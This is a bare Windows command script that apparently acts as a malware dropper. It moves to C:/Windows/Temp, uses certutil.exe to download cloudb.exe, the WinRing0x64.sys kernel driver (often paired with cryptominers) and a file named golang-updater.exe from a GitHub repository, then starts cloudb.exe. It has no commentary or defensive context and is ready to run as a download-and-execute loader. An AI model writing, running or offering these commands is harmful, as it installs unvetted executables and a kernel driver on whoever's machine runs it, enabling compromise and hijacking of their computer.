cd C:/Windows/Temp

certutil.exe -URLCache -split -f https://raw.githubusercontent.com/Fabian066/readmeabout/refs/heads/main/cloudb.exe cloudb.exe

certutil.exe -URLCache -split -f https://raw.githubusercontent.com/Fabian066/readmeabout/refs/heads/main/WinRing0x64.sys WinRing0x64.sys

certutil.exe -URLCache -split -f https://raw.githubusercontent.com/Fabian066/readmeabout/refs/heads/main/golang-updater.exe golang-updater.exe

start cloudb.exe
